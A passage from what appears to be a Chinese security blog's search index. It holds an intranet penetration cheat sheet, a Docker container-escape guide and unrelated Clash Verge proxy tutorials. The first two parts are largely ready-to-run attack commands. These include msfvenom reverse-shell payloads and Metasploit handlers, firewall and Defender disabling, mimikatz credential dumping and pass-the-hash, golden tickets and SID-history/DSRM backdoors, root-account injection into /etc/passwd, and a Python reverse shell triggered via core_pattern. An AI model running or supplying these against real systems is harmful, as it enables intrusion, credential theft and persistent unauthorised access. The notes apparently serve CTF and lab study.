#复制文件到目标ip的c盘下面 计划任务 schtasks /query /tn taskName #查看计划任务，不加/tn为所有计划任务 schtasks /create /tn \u0026#34;taskName\u0026#34; /tr C:\\shell.exe /sc once /st 18:05 /S 192.168.52.138 /RU System /RL HIGHEST /u administrator /p \u0026#34;Liu78963\u0026#34; #创建计划任务，18:05分启动，就启动一次，计划任务名称为taskName schtasks /delete /tn taskName #删除计划任务 netstat 查看端口是否开放 netstat -ano | find \u0026#34;3389\u0026#34; 开启3389命令 REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\u0026#34; \u0026#34;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f 查看进程并删除 tasklist | findstr \u0026#34;artifact\u0026#34; taskkill /pid 2888 -f 关闭防火墙\n本地关闭 netsh advfirewall set allprofiles state off net stop windefend netsh advfirewall firewall set rule group=\u0026#34;Remote Desktop\u0026#34; new enable=yes #防火墙设置白名单 - 远程关闭\rnet use \\\\192.168.93.10\\ipc$ \u0026#34;dc123.com\u0026#34; /user:\u0026#34;administrator\u0026#34; sc \\\\192.168.93.10 create unablefirewall binpath= \u0026#34;netsh advfirewall set allprofiles state off\u0026#34; sc \\\\192.168.93.10 start unablefirewall net use \\\\192.168.93.10\\ipc$ /del 开启远程桌面 wmic RDTOGGLE WHERE ServerName=\u0026#39;%COMPUTERNAME%\u0026#39; call SetAllowTSConnections 1 #开启远程桌面功能 程序异常弹窗解决\n关闭所有程序异常弹窗 reg add \u0026#34;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\u0026#34; /v \u0026#34;DontShowUI\u0026#34; /t REG_DWORD /d 1 /f reg add \u0026#34;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\u0026#34; /v \u0026#34;Disabled\u0026#34; /t REG_DWORD /d 1 /f reg add \u0026#34;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\u0026#34; /v \u0026#34;LoggingDisabled\u0026#34; /t REG_DWORD /d 1 /f reg add \u0026#34;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\u0026#34; /v \u0026#34;DontSendAdditionalData\u0026#34; /t REG_DWORD /d 1 /f - 开启所有程序异常弹窗\rreg delete \u0026#34;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\u0026#34; /v DontShowUI /f reg delete \u0026#34;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\u0026#34; /v Disabled /f reg delete \u0026#34;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\u0026#34; /v LoggingDisabled /f reg delete \u0026#34;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\u0026#34; /v DontSendAdditionalData /f 注意：win7下的弹窗错误程序为WerFault.exe，使用计划任务不会出现弹窗错误\nwmic命令执行 net use \\\\192.168.7.7\\ipc$ \u0026#34;1qaz@WSX\u0026#34; /user:administrator #建立ipc链接 wmic /node:192.168.7.7 process call create \u0026#34;cmd.exe /c ipconfig \u0026gt;c:\\ip.txt\u0026#34; #执行cmd命令并将结果保存在txt文档中 type \\\\192.168.7.7\\C$\\ip.txt #查看执行结果 或 wmic /node:192.168.7.7 /user:administrator /password:1qaz@WSX1qaz@WSX process call create \u0026#34;cmd /c ipconfig \u0026gt; c:\\1.txt\u0026#34; 启用dsrm登录 New-ItemProperty \u0026#34;HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\\u0026#34; -name \u0026#34;DsrmAdminLogonBehavior\u0026#34; -value 2 -propertyType DWORD #powershell 或 reg add \u0026#34;HKLM\\System\\CurrentControlSet\\Control\\Lsa\u0026#34; /f /v DsrmAdminLogonBehavior /t REG_DWORD /d 2 修改注册表抓明文(win10或2012R2以上，未验证） reg add HKLM/SYSTEM/CurrentControlSet/Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f 其他命令 netsh winsock reset #重启网络 横向移动 ping扫描 for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.52.%I | findstr \u0026#34;TTL=\u0026#34; 用Ping命令探测内网主机 MSF MSF生成Windows木马命令 反向链接木马msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.100.131 lport=6000 -f exe \u0026gt;shell.exe 反向链接木马操作 msfconsole use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set lhost 127.0.0.1 #设置监听ip，必须和frpc中的local_ip 一致 set lport 2222 #设置监听端口，与frpc中的local_port一致 exploit MSF生成Linux木马命令 反向链接木马 msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=192.168.48.136 lport=4444 -f elf \u0026gt; shell.elf 反向链接木马操作 msfconsole use exploit/multi/handler set payload linux/x64/meterpreter/reverse_tcp set lhost 127.0.0.1 #设置监听ip，必须和frpc中的local_ip 一致 set lport 2222 #设置监听端口，与frpc中的local_port一致 exploit MSF生成Linux系统的Java网站木马命令 木马msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=192.168.48.136 lport=2222 -f jsp \u0026gt; shell.jsp 链接操作 msfconsole use exploit/multi/handler set payload linux/x64/meterpreter/reverse_tcp set lhost 127.0.0.1 #设置监听ip，必须和frpc中的local_ip 一致 set lport 2222 #设置监听端口，与frpc中的local_port一致 exploit MSF常见命令 getuid #获取当前账号权限 getsystem #获取system权限 run post/windows/manage/enable_rdp #关闭windows防火墙 run post/windows/gather/smart_hashdump 获取window哈希 run autoroute -s 192.168.52.0/24 #添加路由，在木马上使用 autoroute -p #查看路由，在密码上使用 route add 192.168.138.0 255.255.255.0 1 #添加路由在msf上使用 route print #查看路由在msf上使用 run post/windows/gather/enum_patches #查看补丁情况 setg Proxies socks5:127.0.0.1:1080 #设置代理 show options lhost #显示lhost的设置 psexec传递 （确保已经设置好路由） use exploit/windows/smb/psexec set payload windows/x64/meterpreter/bind_tcp set rhost 10.10.10.10 set SMBUser administrator set SMBPass 1qaz@WSX run MSF使用ms17-010开启3389 use auxiliary/admin/smb/ms17_010_command set COMMAND REG ADD HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Terminal\\\u0026#34; \\\u0026#34;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f set rhost x.x.x.x MSF使用mimikatz（被kiwi取代） migrate [PID] #如果是x64需要这个步骤 load kiwi #加载模块 help kiwi #查看帮助 creds_all：列举所有凭据 creds_kerberos：列举所有kerberos凭据 creds_msv：列举所有msv凭据 creds_ssp：列举所有ssp凭据 creds_tspkg：列举所有tspkg凭据 creds_wdigest：列举所有wdigest凭据 dcsync：通过DCSync检索用户帐户信息 dcsync_ntlm：通过DCSync检索用户帐户NTLM散列、SID和RID golden_ticket_create：创建黄金票据 kerberos_ticket_list：列举kerberos票据 kerberos_ticket_purge：清除kerberos票据 kerberos_ticket_use：使用kerberos票据 kiwi_cmd：执行mimikatz的命令，后面接mimikatz.exe的命令 lsa_dump_sam：dump出lsa的SAM lsa_dump_secrets：dump出lsa的密文 password_change：修改密码 wifi_list：列出当前用户的wifi配置文件 wifi_list_shared：列出共享wifi配置文件/编码 MSF smb爆破密码 use auxiliary/scanner/smb/smb_login set SMBUser administrator set PASS_FILE /root/fuzzDicts/passwordDict/top500.txt set rhost 192.168.93.10 exploit MSF 令牌偷取（用于提权） getuid #查看当前token use incognito #加载incognito list_tokens -u #列出AccessToken impersonate_token \u0026#34;TEST\\adminitrator\u0026#34; #模拟TEST\\adminitrator用户 rev2self #返回到之前的AccessToken权限 MSF存活主机探测 use auxiliary/scanner/discovery/udp_probe set rhosts 192.168.183.0/24 set threads 5 exploit MSF powershell 攻击 use exploit/multi/script/web_delivery set target 2 # 选择使用powershell类型的payload set payload windows/meterpreter/reverse_tcp set lport 2222 set lhost 192.168.135.150 exploit MSF清除痕迹 run event_manager -i run event_manager -c 小工具使用 Mimitakz使用 获取账号密码 privilege::debug #权限提升 sekurlsa::logonPasswords #获取账号密码 获取NTLM hash privilege::debug token::elevate lsadump::sam hash攻击 （会弹出一个cmd窗口，有风险） privilege::debug sekurlsa::pth /domain:DC /user:Administrator /ntlm:e8bea972b3549868cecd667a64a6ac46 #DC是域控的名称 ntlm是上述获得结果 Eeathworm使用 -l listenport open a port for the service startup. // 为服务启动打开一个端口。 -d refhost set the reflection host address. // 设置反连主机地址。 -e refport set the reflection port. // 设置反连端口。 -f connhost set the connect host address . // 设置连接主机地址。 -g connport set the connect port. // 设置连接端口。 -t usectime set the milliseconds for timeout. The default value is 1000 // 设置超时的毫秒数。默认值值为1000 -s state setup the function. // 状态设置功能。共有六种ssocksd rcsocks rssocks lcx_slave lcx_tran lcx_listen ssocksd rcsocks rssocks 为socket5 正向代理，反向代理，正反向代理 lcx_slave 控制管道：一侧通过反弹方式连接代理请求方，另一侧连接代理提供主机。 lcx_tran 转发管道：通过监听本地端口接收代理请求，并转交给代理提供主机。 lcx_listen 监听管道：通过监听本地端口接收数据，并将其转交给目标网络回连的代理提供主机。 proxychains4 使用方法 proxychains4 nmap -p 3389 -Pn -sT 192.168.52.141 # 需要配置/etc/proxychains4.conf文件 -Pn和-sT必须要有， 192.168.52.141是要扫描的内网地址 chisel使用 端口转发 #将本地的11111端口转发到服务器上的8000端口 正向链接 ./chisel server -p 12345 chisel.exe client 192.168.61.128:12345 11111:127.0.0.1:8000 反向链接 chisel.exe server -p 12345 --reverse ./chisel client 192.168.61.129:12345 R:11111:127.0.0.1:8000 socks代理 本地1088端口代理服务器 正向链接 chisel.exe server -p 12345 --socks5 ./chisel client 192.168.61.129:12345 1088:socks 反向链接 ./chisel server -p 12345 --reverse --socks5 ./chisel client 192.168.111.2:12345 R:1088:socks 权限维持 黄金票据 导出域控制器用户密码或hash privilege::debug lsadump::lsa /patch # 专用于在域控制器上导出用户密码或hash 切换到用户主机下使用minikatz生成票据 kerberos::golden /user:administrator /domain:de1ay.com /sid:S-1-5-21-2756371121-2868759905-3853650604 /krbtgt:82dfc71b72a11ef37d663047bc2088fb /ticket:ticket.kirbi # kerberos::golden /user:需要伪造的域管理员用户名 /domain:demo.com /sid:域sid /krbtgt: krbtgt用户的Hash /ticket:ticket.kirbi 修改票据 kerberos::purge #先清空所有票据 kerberos::ptt ticket.kirbi #再将生成的票据注入域用户主机Windows7中 kerberos::tgt #查看系统票据 SID History域后门 添加恶意用户 net user aaa Aaa123456 /add #添加用户名为aaa密码为Aaa123456的用户\r使用mimikatz将域管理员的SID添加到恶意域用户\nprivilege::debug sid::patch sid::add /sam:aaa /new:Administrator //将管理员Administrator的SID添加到用户aaa的SID History属性中 DSRM 后门 修改DSRM账户（需要远程登录调用cmd窗口，有危险） ntdsutil // 进入ntdsutil set dsrm password // 设置DSRM账户的密码 reset password on server null // 在当前域控制器上恢复DSRM密码 \u0026lt;password\u0026gt; // 输入新密码 \u0026lt;password\u0026gt; // 重新输入新密码 q //退出DSRM密码设置模式 q // 退出ntdsutil DSRM与域用户同步（于第一步类似，不必重复） ntdsutil // 进入ntdsutil set dsrm password // 设置DSRM账户的密码 sync from domain account domainusername // 使DSRM的密码和指定的domainusername域用户的密码同步 q //退出DSRM密码设置模式 q // 退出ntdsutil 启用DSRM登录 New-ItemProperty \u0026#34;HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\\u0026#34; -name \u0026#34;DsrmAdminLogonBehavior\u0026#34; -value 2 -propertyType DWORD #powershell 或 reg add \u0026#34;HKLM\\System\\CurrentControlSet\\Control\\Lsa\u0026#34; /f /v DsrmAdminLogonBehavior /t REG_DWORD /d 2 #cmd方式 mimikatz获取NTLM hash （见mimikate用法） mimikatz使用hash攻击 （见mimikate用法） 提权 Linux提取放行普通用户提权 创建普通用户（密码123456） echo \u0026#39;meme:x:1001:1001:,,,:/home/meme:/bin/bash\u0026#39; \u0026gt;\u0026gt; /etc/passwd echo \u0026#39;meme:x:1001:\u0026#39; \u0026gt;\u0026gt; /etc/group echo \u0026#39;meme:$6$Mig86wnH$wtvw4k8NpI7SVQ1Noc8OMb2nEg5gw5o4PBN81KIvF5Qw9WHDWo1XqD/5qt93bsJ8qarKAFERQLp/3AXAleGZn/:19625:0:99999:7:::\u0026#39; \u0026gt;\u0026gt; /etc/shadow echo \u0026#39;meme:!::\u0026#39; \u0026gt;\u0026gt; /etc/gshadow 提权 echo \u0026#39;ubuntu ALL=(ALL:ALL) ALL\u0026#39; \u0026gt;\u0026gt; /etc/sudoers #需要root权限才能做，不能使用sudo sudo su root #输入ubuntu用户的密码即可 创建root用户（密码123456） echo \u0026#39;xi:x:0:0:root:/root:/bin/bash\u0026#39; \u0026gt;\u0026gt; /etc/passwd echo \u0026#39;xi:x:0:\u0026#39; \u0026gt;\u0026gt; /etc/group echo \u0026#39;xi:$6$Mig86wnH$wtvw4k8NpI7SVQ1Noc8OMb2nEg5gw5o4PBN81KIvF5Qw9WHDWo1XqD/5qt93bsJ8qarKAFERQLp/3AXAleGZn/:19625:0:99999:7:::\u0026#39; \u0026gt;\u0026gt; /etc/shadow echo \u0026#39;xi:!::\u0026#39; \u0026gt;\u0026gt; /etc/gshadow suid ps程序提权 前提条件，存在一个SUID程序，并且该程序调用ps命令 判断条件： find / -perm -u=s -type f 2\u0026gt;/dev/null # 查找短暂拥有root权限的命令程序 修改环境变量，伪造ps命令 cd /tmp echo \u0026#34;/bin/bash\u0026#34; \u0026gt; ps chmod 777 ps export PATH=/tmp:$PATH # 将/tmp添加到环境变量中，并且先加载执行/tmp里的程序 或 ln -s /bin/bash /tmp/ps 执行判断条件2中获取的程序。 警告：需要在反弹shell上使用，无法在webshell上成功执行和提权，需要全交交互式才行\nlinux ssh免登录方式 本地生成文件 ssh-keygen -t rsa #生成公钥和私钥 (echo -e \u0026#34;\\n\\n\u0026#34;; cat ~/.ssh/id_rsa.pub; echo -e \u0026#34;\\n\\n\u0026#34;) \u0026gt; public.txt #到处公钥 (echo -e \u0026#34;\\n\\n\u0026#34;; cat /root/.ssh/id_rsa; echo -e \u0026#34;\\n\\n\u0026#34;) \u0026gt; private.txt #到处私钥 公钥上传 cp -avx ~/ubuntu/.ssh/id_rsa.pub ~/.ssh/authorized_keys #~/.ssh/authorized_keys 是上传的文件路径 echo \u0026#39;生成的.pub文件的内容即hello.pub\u0026#39; \u0026gt; ~/.ssh/authorized_keys #写入文件 ","permalink":"https://ruralbee.github.io/posts/ctf/ctf_intranet/","summary":"内网渗透 Kali 探测命令 netdiscover\nnetdiscover -i eth0 -r 192.168.111.0/24 探测网卡下同段存在主机 namp\nnmap 192.168.111.129` # 探测存在的服务 nmap -T4 -sC -sV 192.168.1.8 -p: 指定端口扫描范围 -F：扫描比缺省少的端口 -A：使能系统探测、版本检测、脚本扫描、路由追踪 -O：探测指定IP的相关数据。 -sP：主机探测 -sL:列出需要扫描的目标，不扫描 -sn:只做ping扫描，不做端口扫描 -Pn：跳过主机发现，视所有主机都在线 -PS/PA/PU/PY[portlist]：基于TCP（SYN、ACK）、UDP、SCTP的指定端口的主机发现 -PE/PP/PM：基于ICMP的echo、timestamp、network request的主机发现 -PO[Protocol list]：基于IP协议字段的ping扫描 -n/-R: -n表示不对目标最DNS解析，-R表示进行DNS解析，缺省为必要时候进行DNS解析 --dns-servers \u0026lt;serv1[,serv2],...\u0026gt;: 指定DNS 服务器 --system-dns:调用系统的DNS服务器 --traceroute：显示追踪到目标的路径 -sS/sT/sA/sW/sM:TCP扫描 -sS是SYN扫描，半连接扫描，nmap只发送SYN报文，通过服务器是否响应SYN+ACK来判断对应端口是否开放 -sT是全连接扫描会和服务器建立完整的三次握手，效率低 -sA发送ACK报文，通过服务器响应来判断是否开放，有的服务器不开会回复ICMP端口不可达，当回复RST时表示可能被拦截或者端口开放，不是一个准确的判断条件 -sW 是窗口扫描，发出的报文和ACK一样，利用的是在某些系统中如果端口开放，收到ACK包后会响应一个窗口非0的RST包 -sM是Maimon扫描，使用发现者的名字命名。其原理是向目标服务器发送FIN/ACK 报文，在某些系统中如果端口开放则会丢弃该报文不做响应，如果端口关闭则回复RST或者ICMP，Nmap可借此判断服务器端口的开放情况。不准 -sU：UDP扫描，某些系统如果UDP端口不开放会回复ICMP差错报文（这也是Linux系统中traceroute的实现原理）。Nmap UDP端口扫描的强大之处在于它会针对知名端口构造初始交互报文，比如会针对UDP 500构造一个主模式协商的IKE报文 -sN/sF/sX:特定TCP标志位的扫描，N是空标志位；F是FIN置位；X是Xmas扫描将FIN、PSH、URG同时置位。收到RST说明端口关闭，无响应说明被过滤或者端口开放，不准。 -sY/sZ:SCTP协议INIT或cookie-echo扫描 -sO:基于IP协议的扫描，通过变换IP报文头中的Protocol值来对服务器进行探测 -b \u0026lt;FTP relay host\u0026gt;:：FTP反弹扫描，借助FTP特性，通过FTP服务器连接想要扫描的主机实现隐身的目的 Linux 常见命令 uname -a # 获取所有版本信息 uname -m # 获取Linux内核架构 cat /proc/version # 获取内核信息 cat /etc/*-release # 发布信息 cat /etc/issue # 发布信息 hostname # 获取主机名 cat /etc/passwd # 列出系统所有用户 cat /etc/group # 列出系统所有组 w # 查看目前登录的用户 whoami # 查看当前用户 id # 查看当前用户信息 sudo -l # 列出目前用户可执行与无法执行的指令 ps aux # 查看进程信息 ls -la /etc/cron* # 查看计划任务 ifconfig -a # 列出网络接口信息 cat /etc/network/interfaces # 列出网络接口信息 arp -a # 查看系统arp表 route # 打印路由信息 netstat -anplt # 打印本地端口开放信息 iptables -L # 列出iptable的配置规则 nohup 命令 \u0026amp; #后台运行 Windows 初步收集 查看基本信息命令 ipconfig /all # 查看本机ip，所在域 route print # 打印路由信息 net view # 查看局域网内其他主机名 net view /domain # 查看主域信息 arp -a # 查看arp缓存 net start # 查看开启了哪些服务 net share # 查看开启了哪些共享 net config Workstation # 查看计算机名、全名、用户名、系统版本、工作站、域、登录域 echo %PROCESSOR_ARCHITECTURE% // 查看系统体系结构 systeminfo // 查看操作系统信息 nslookup god.","title":"内网渗透总结"},{"content":"云安全 Docker Docker安装 curl -fsSL https://get.docker.com/ | sh 或则\nwget -qO- https://get.docker.com/ | sh\nDocker-Compose安装 sudo curl -L \u0026#34;https://github.com/docker/compose/releases/download/1.23.2/docker-compose-$(uname -s)-$(uname -m)\u0026#34; -o /usr/local/bin/docker-compose sudo chmod +x /usr/local/bin/docker-compose docker-compose --version 判断是否在docker或kubepods cat /proc/1/cgroup #是否有docker或k8s关键字样 ls -al / #是否有.dockerenv文件 mount | grep \u0026#39;/ type\u0026#39; #是否有docker关键字样 特权模式逃逸 启动靶场：\ndocker run --rm --privileged=true -it alpine\n判断特权：\ncat /proc/self/status | grep CapEff #是否为0000003fffffffff 或者是 0000001fffffffff\n查看目录：\nfdisk -l #需要找到相对应的编号，这里为3\n特权逃逸：\nmkdir /test \u0026amp;\u0026amp; mount /dev/sda3 /test\n判断结果：\ncd /test/ \u0026amp;\u0026amp; ls\n挂载Docker Socket逃逸 启动靶场：\ndocker run -itd --name with_docker_sock -v /var/run/docker.sock:/var/run/docker.sock ubuntu\n进入环境：\ndocker exec -it with_docker_sock /bin/bash\n检测环境：\nls -lah /var/run/docker.sock #检测是否存在该文件\n挂载逃逸：\napt-get update apt-get install curl -y curl -fsSL https://get.docker.com/ | sh #在容器内部创建一个新的容器，并将宿主机目录挂载到新的容器内部 docker run -it -v /:/host ubuntu /bin/bash chroot /host 挂载宿主机procfs逃逸 启动环境：\ndocker run -it -v /proc/sys/kernel/core_pattern:/host/proc/sys/kernel/core_pattern ubuntu 检测环境：\nfind / -name core_pattern #返回值第二个 #这里是/host/proc/sys/kernel/core_pattern，与步骤6对应 查找路径(workdir) ：\ncat /proc/mounts | xargs -d \u0026#39;,\u0026#39; -n 1 | grep workdir #这里是workdir=/var/lib/docker/overlay2/8a4f56c483fe7890313472c9127363586a192eeae1484b0f54668fd631f21f64/ 写入文件（真机上的python环境）：\ncat \u0026gt;/tmp/.x.py \u0026lt;\u0026lt; EOF #!/usr/bin/python3 import os import pty import socket lhost = \u0026#34;xx.xx.xx.xx\u0026#34; lport = xxxx def main(): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((lhost, lport)) os.dup2(s.fileno(), 0) os.dup2(s.fileno(), 1) os.dup2(s.fileno(), 2) os.putenv(\u0026#34;HISTFILE\u0026#34;, \u0026#39;/dev/null\u0026#39;) pty.spawn(\u0026#34;/bin/bash\u0026#34;) os.remove(\u0026#39;/tmp/.x.py\u0026#39;) s.close() if __name__ == \u0026#34;__main__\u0026#34;: main() EOF 文件赋予执行权限\nchmod +x /tmp/.x.py 反弹 shell 到目标的 proc 目录\necho -e \u0026#34;|/var/lib/docker/overlay2/8a4f56c483fe7890313472c9127363586a192eeae1484b0f54668fd631f21f64/merged/tmp/.x.py \\rcore \u0026#34; \u0026gt; /host/proc/sys/kernel/core_pattern 制作崩溃程序（实战中直接上传程序）\ncat \u0026gt;/tmp/x.c \u0026lt;\u0026lt; EOF #include \u0026lt;stdio.h\u0026gt; int main(void) { int *a = NULL; *a = 1; return 0; } EOF 执行程序\ncd /tmp gcc x.c -o x ./x 监听反弹端口\nnc -lvvp xxxx ","permalink":"https://ruralbee.github.io/posts/ctf/ctf_cloudsec/","summary":"云安全 Docker Docker安装 curl -fsSL https://get.docker.com/ | sh 或则\nwget -qO- https://get.docker.com/ | sh\nDocker-Compose安装 sudo curl -L \u0026#34;https://github.com/docker/compose/releases/download/1.23.2/docker-compose-$(uname -s)-$(uname -m)\u0026#34; -o /usr/local/bin/docker-compose sudo chmod +x /usr/local/bin/docker-compose docker-compose --version 判断是否在docker或kubepods cat /proc/1/cgroup #是否有docker或k8s关键字样 ls -al / #是否有.dockerenv文件 mount | grep \u0026#39;/ type\u0026#39; #是否有docker关键字样 特权模式逃逸 启动靶场：\ndocker run --rm --privileged=true -it alpine\n判断特权：\ncat /proc/self/status | grep CapEff #是否为0000003fffffffff 或者是 0000001fffffffff\n查看目录：\nfdisk -l #需要找到相对应的编号，这里为3\n特权逃逸：\nmkdir /test \u0026amp;\u0026amp; mount /dev/sda3 /test","title":"云安全总结"},{"content":"软件下载: Clash Verge 简介： Clash Verge 是 Clash 的一个图形用户界面（GUI）客户端，支持 Windows、macOS、Linux 等操作系统。它能够帮助用户实现科学上网，同时具备强大的规则配置和灵活的代理策略，使用户可以更轻松地管理代理规则和节点。 下载链接： 下载地址 下载安装步骤： 下载github加速工具\n打开浏览器，输入网址https://steampp.net/，下载Watt Toolkit工具并安装 启动加速工具\n分别按照下面图片的步骤依次点击：网络加速-\u0026gt;勾选GitHub-\u0026gt;一键加速，出现第二张图片的加速已成功启动，表示已经成功\n点击上方下载链接浏览器会自动跳到github下载页面，如果没有成功跳转在浏览器中输入以下链接https://github.com/zzzgydi/clash-verge/releases/,下图所示为成功打开下载页面。 滑动网页选择windows或Mac相应的软件 购买机场 机场使用与步骤： 机场推荐：点击这里 选择机场\n这里使用八戒机场为案例，机场网址为：网址，输入邮箱和密码后，通过人机验证后即可购买。 点击购买订阅-\u0026gt;选择套餐-\u0026gt;点击下单-\u0026gt;结账-\u0026gt;选择支付方式，之后付款即可。 返回仪表盘-\u0026gt;一键订阅-\u0026gt;复制订阅地址 Clash Verge使用 使用步骤： clashe verge安装 安装clashe verge，并修改软件语言为中文：Settings-\u0026gt;Language-\u0026gt;中文 返回配置-\u0026gt;输入刚才复制的订阅地址，然后点击导入，导入成功为第二张图 返回设置-\u0026gt;开启系统代理，之后就能够魔法上网。 clash verge高级使用方法参考：clash verge ","permalink":"https://ruralbee.github.io/posts/vpn/magic_internet/","summary":"软件下载: Clash Verge 简介： Clash Verge 是 Clash 的一个图形用户界面（GUI）客户端，支持 Windows、macOS、Linux 等操作系统。它能够帮助用户实现科学上网，同时具备强大的规则配置和灵活的代理策略，使用户可以更轻松地管理代理规则和节点。 下载链接： 下载地址 下载安装步骤： 下载github加速工具\n打开浏览器，输入网址https://steampp.net/，下载Watt Toolkit工具并安装 启动加速工具\n分别按照下面图片的步骤依次点击：网络加速-\u0026gt;勾选GitHub-\u0026gt;一键加速，出现第二张图片的加速已成功启动，表示已经成功\n点击上方下载链接浏览器会自动跳到github下载页面，如果没有成功跳转在浏览器中输入以下链接https://github.com/zzzgydi/clash-verge/releases/,下图所示为成功打开下载页面。 滑动网页选择windows或Mac相应的软件 购买机场 机场使用与步骤： 机场推荐：点击这里 选择机场\n这里使用八戒机场为案例，机场网址为：网址，输入邮箱和密码后，通过人机验证后即可购买。 点击购买订阅-\u0026gt;选择套餐-\u0026gt;点击下单-\u0026gt;结账-\u0026gt;选择支付方式，之后付款即可。 返回仪表盘-\u0026gt;一键订阅-\u0026gt;复制订阅地址 Clash Verge使用 使用步骤： clashe verge安装 安装clashe verge，并修改软件语言为中文：Settings-\u0026gt;Language-\u0026gt;中文 返回配置-\u0026gt;输入刚才复制的订阅地址，然后点击导入，导入成功为第二张图 返回设置-\u0026gt;开启系统代理，之后就能够魔法上网。 clash verge高级使用方法参考：clash verge ","title":"2023年windows,Mac科学上网"},{"content":"Clash Verge下载 简介： Clash Verge 是 Clash 的一个图形用户界面（GUI）客户端，支持 Windows、macOS、Linux 等操作系统。它能够帮助用户实现科学上网，同时具备强大的规则配置和灵活的代理策略，使用户可以更轻松地管理代理规则和节点。 下载链接： 下载地址 下载安装步骤： 下载github加速工具\n打开浏览器，输入网址https://steampp.net/，下载Watt Toolkit工具并安装 启动加速工具\n分别按照下面图片的步骤依次点击：网络加速-\u0026gt;勾选GitHub-\u0026gt;一键加速，出现第二张图片的加速已成功启动，表示已经成功\n点击上方下载链接浏览器会自动跳到github下载页面，如果没有成功跳转在浏览器中输入以下链接https://github.com/zzzgydi/clash-verge/releases/,下图所示为成功打开下载页面。 滑动网页选择windows或Mac相应的软件 Clash Verge初级使用 使用步骤： clashe verge安装 安装clashe verge，并修改软件语言为中文：Settings-\u0026gt;Language-\u0026gt;中文 导入机场订阅： 配置-\u0026gt;输入机场订阅地址，然后点击导入 导入成功会出现对应机场，如下图所示 魔法上网：返回设置-\u0026gt;开启系统代理，就能够魔法上网。 修改机场节点：代理-\u0026gt;节点选择-\u0026gt;选择节点（选择延迟数值较小的节点，显示为Error的节点不要选择），这里可以选择全局上网，一般情况下不用选择 Clash Verge与浏览器插件联动 使用说明：\n该方法仅浏览器魔法上网，其余电脑软件不魔法上网，可以节省机场流量的使用。 访问应用商店： 以chrome为例（确保clash verge已经开启系统代理）：左上角按钮-\u0026gt;拓展程序-\u0026gt;访问Chrome应用商店 搜索插件： 搜索界面输入SwitchyOmega-\u0026gt;点击显示的插件，如图所示 添加插件： 添加至chrome-\u0026gt;添加拓展程序-\u0026gt;跳过教程 修改插件配置： 选中proxy-\u0026gt;修改代理服务器为：127.0.0.1 -\u0026gt; 代理端口为7890（此处的端口与\u0026rsquo;设置-\u0026gt;端口设置\u0026rsquo;中端口一致，默认为7890） -\u0026gt; 应用选项 插件显示： 拓展程序-\u0026gt;固定 插件应用： SwitchyOmega-\u0026gt;proxy 关闭系统代理： 返回设置-\u0026gt;关闭系统代理，能够实现只有安装插件的浏览器魔法上网。 Clash Verge 全局路由上网 使用说明：\n下面的方法适用于电脑上任何一个应用都能够魔法上网如cmd等应用 安装服务模式： 设置-\u0026gt;服务模式-\u0026gt;点击小盾牌-\u0026gt;点击INSTALL。 Tun模式： 设置-\u0026gt;Tun模式，设置-\u0026gt;服务模式 都开启 测试 打开cmd窗口-\u0026gt;输入ping google.com，有正常回显，表示成功 ","permalink":"https://ruralbee.github.io/posts/vpn/clashverge/","summary":"Clash Verge下载 简介： Clash Verge 是 Clash 的一个图形用户界面（GUI）客户端，支持 Windows、macOS、Linux 等操作系统。它能够帮助用户实现科学上网，同时具备强大的规则配置和灵活的代理策略，使用户可以更轻松地管理代理规则和节点。 下载链接： 下载地址 下载安装步骤： 下载github加速工具\n打开浏览器，输入网址https://steampp.net/，下载Watt Toolkit工具并安装 启动加速工具\n分别按照下面图片的步骤依次点击：网络加速-\u0026gt;勾选GitHub-\u0026gt;一键加速，出现第二张图片的加速已成功启动，表示已经成功\n点击上方下载链接浏览器会自动跳到github下载页面，如果没有成功跳转在浏览器中输入以下链接https://github.com/zzzgydi/clash-verge/releases/,下图所示为成功打开下载页面。 滑动网页选择windows或Mac相应的软件 Clash Verge初级使用 使用步骤： clashe verge安装 安装clashe verge，并修改软件语言为中文：Settings-\u0026gt;Language-\u0026gt;中文 导入机场订阅： 配置-\u0026gt;输入机场订阅地址，然后点击导入 导入成功会出现对应机场，如下图所示 魔法上网：返回设置-\u0026gt;开启系统代理，就能够魔法上网。 修改机场节点：代理-\u0026gt;节点选择-\u0026gt;选择节点（选择延迟数值较小的节点，显示为Error的节点不要选择），这里可以选择全局上网，一般情况下不用选择 Clash Verge与浏览器插件联动 使用说明：\n该方法仅浏览器魔法上网，其余电脑软件不魔法上网，可以节省机场流量的使用。 访问应用商店： 以chrome为例（确保clash verge已经开启系统代理）：左上角按钮-\u0026gt;拓展程序-\u0026gt;访问Chrome应用商店 搜索插件： 搜索界面输入SwitchyOmega-\u0026gt;点击显示的插件，如图所示 添加插件： 添加至chrome-\u0026gt;添加拓展程序-\u0026gt;跳过教程 修改插件配置： 选中proxy-\u0026gt;修改代理服务器为：127.0.0.1 -\u0026gt; 代理端口为7890（此处的端口与\u0026rsquo;设置-\u0026gt;端口设置\u0026rsquo;中端口一致，默认为7890） -\u0026gt; 应用选项 插件显示： 拓展程序-\u0026gt;固定 插件应用： SwitchyOmega-\u0026gt;proxy 关闭系统代理： 返回设置-\u0026gt;关闭系统代理，能够实现只有安装插件的浏览器魔法上网。 Clash Verge 全局路由上网 